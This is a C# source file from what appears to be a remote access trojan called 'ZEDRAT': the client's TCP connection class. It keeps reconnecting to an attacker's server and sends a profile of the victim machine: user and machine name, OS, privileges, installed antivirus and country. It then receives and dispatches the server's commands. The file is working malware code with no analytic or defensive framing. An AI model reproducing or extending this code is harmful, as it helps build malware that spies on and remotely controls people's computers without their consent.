using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using ZEDRAT.Algorithm;
using ZEDRAT.Messages;

namespace Client
{
	public class TcpServer
	{
		public string _RemoteAddress;

		public readonly string _senssionSign = Guid.NewGuid().ToString();

		public int _HeadPacketSize;

		public readonly object obj = new object();

		public NetworkStream ns;

		public TcpClient _RemoteClient;

		public bool _FristConnect { get; set; } = true;


		public int _Port { get; set; }

		public List<byte> _HeadAndPayloadPacket { get; set; } = new List<byte>();


		public IAsyncEventDispatcher _Idispatchar { get; set; }

		public TcpServer(string RemoteAddress, int Port)
		{
			this._RemoteAddress = RemoteAddress;
			this._Port = Port;
			this._Idispatchar = new IAsyncEventDispatcher(this);
			this._HeadPacketSize = 1 + this._senssionSign.Length + 8;
			this.TryToConnect();
		}

		private void TryToConnect()
		{
			try
			{
				this._RemoteClient = new TcpClient();
				while (!this._RemoteClient.Connected)
				{
					if (!this._FristConnect)
					{
						Thread.Sleep(3000);
					}
					if (this.IsValidDomainName(this._RemoteAddress))
					{
						IPAddress[] hostAddresses = Dns.GetHostAddresses(this._RemoteAddress);
						foreach (IPAddress address in hostAddresses)
						{
							try
							{
								this._RemoteClient.Connect(new IPEndPoint(address, this._Port));
							}
							catch
							{
							}
						}
					}
					else
					{
						try
						{
							this._RemoteClient.Connect(this._RemoteAddress, this._Port);
						}
						catch
						{
						}
					}
					this._FristConnect = false;
				}
				this.SetSocketOptions();
				this.ns = this._RemoteClient.GetStream();
				this.ns.Write(Encoding.UTF8.GetBytes(this._senssionSign), 0, this._senssionSign.Length);
				this.Client_Send(1235, GZip.Compress(Serializable.Serialize(new GetCilentInfo
				{
					_MachineUserName = Systeminfo.GetPCandUser(),
					_MachineName = Systeminfo.GetMachineName(),
					_OperatingSystem = Systeminfo.GetPlatformHelper(),
					_StatrTime = Systeminfo.GetComputerStartTime(),
					_Install = Systeminfo.InstallTime(),
					_Privileges = Systeminfo.GetPrivileges(),
					_Anti_virus = Systeminfo.GetAntivirus(),
					_net = Systeminfo.GetVersionFromRegistry(),
					_Country = Systeminfo.Get_Country()
				})));
				new Thread(new ThreadStart(Client_Receive)).Start();
			}
			catch
			{
				this.Reconnect();
			}
		}

		private void SetSocketOptions()
		{
			this._RemoteClient.Client.IOControl(IOControlCode.KeepAliveValues, this.KeepAlive(1, 30000, 10000), null);
		}

		private byte[] KeepAlive(int onOff, int keepAliveTime, int keepAliveInterval)
		{
			byte[] array = new byte[12];
			BitConverter.GetBytes(onOff).CopyTo(array, 0);
			BitConverter.GetBytes(keepAliveTime).CopyTo(array, 4);
			BitConverter.GetBytes(keepAliveInterval).CopyTo(array, 8);
			return array;
		}

		public void Client_Send(int type, byte[] payload)
		{
			try
			{
				if (!this.ns.CanWrite)
				{
					return;
				}
				List<byte> list = new List<byte>();
				list.AddRange(TcpHeartPacket.StructToByte(new TcpHeartPacket(this._senssionSign, payload.Length, type)));
				list.AddRange(payload);
				lock (this.obj)
				{
					this.ns.Write(list.ToArray(), 0, list.ToArray().Length);
					this.ns.Flush();
				}
			}
			catch
			{
				throw;
			}
		}

		private void Client_Receive()
		{
			try
			{
				while (this._RemoteClient.Connected)
				{
					byte[] array = new byte[16192];
					int num = this.ns.Read(array, 0, 16192);
					if (num != 0)
					{
						byte[] array2 = new byte[num];
						Buffer.BlockCopy(array, 0, array2, 0, num);
						this._HeadAndPayloadPacket.AddRange(array2);
						this.SplitPacket();
						Thread.Sleep(1);
						continue;
					}
					break;
				}
			}
			catch
			{
				this.Reconnect();
			}
		}

		private void SplitPacket()
		{
			try
			{
				if (this._HeadAndPayloadPacket.Count < this._HeadPacketSize)
				{
					return;
				}
				TcpHeartPacket tcpHeartPacket = TcpHeartPacket.ByteToStruct(this._HeadAndPayloadPacket.GetRange(0, this._HeadPacketSize).ToArray());
				if (!tcpHeartPacket._senssionSign.Equals(this._senssionSign))
				{
					this._HeadAndPayloadPacket.Clear();
				}
				else if (tcpHeartPacket._PayloadSize > 16192)
				{
					this._HeadAndPayloadPacket.Clear();
				}
				else if (this._HeadAndPayloadPacket.Count - this._HeadPacketSize >= tcpHeartPacket._PayloadSize)
				{
					if (this._HeadAndPayloadPacket.Count - this._HeadPacketSize > tcpHeartPacket._PayloadSize)
					{
						this._Idispatchar.DispatchMessageHandler(tcpHeartPacket, this._HeadAndPayloadPacket.GetRange(this._HeadPacketSize, tcpHeartPacket._PayloadSize).ToArray());
						this._HeadAndPayloadPacket.RemoveRange(0, tcpHeartPacket._PayloadSize + this._HeadPacketSize);
						this.SplitPacket();
					}
					if (this._HeadAndPayloadPacket.Count - this._HeadPacketSize == tcpHeartPacket._PayloadSize)
					{
						this._Idispatchar.DispatchMessageHandler(tcpHeartPacket, this._HeadAndPayloadPacket.GetRange(this._HeadPacketSize, tcpHeartPacket._PayloadSize).ToArray());
						this._HeadAndPayloadPacket.Clear();
					}
				}
			}
			catch (Exception ex)
			{
				this._HeadAndPayloadPacket.Clear();
				throw ex;
			}
		}

		private bool IsValidDomainName(string name)
		{
			return Uri.CheckHostName(name) != UriHostNameType.Unknown;
		}

		private void Reconnect()
		{
			try
			{
				this._RemoteClient?.Client.Shutdown(SocketShutdown.Both);
				this._RemoteClient?.Client.Disconnect(reuseSocket: true);
				this._RemoteClient?.Client.Close();
				this.ns?.Close();
				this.ns?.Dispose();
				this._HeadAndPayloadPacket?.Clear();
				this._RemoteClient?.Close();
			}
			catch
			{
			}
			finally
			{
				this._FristConnect = true;
				this.ns = null;
				this.TryToConnect();
			}
		}
	}
}
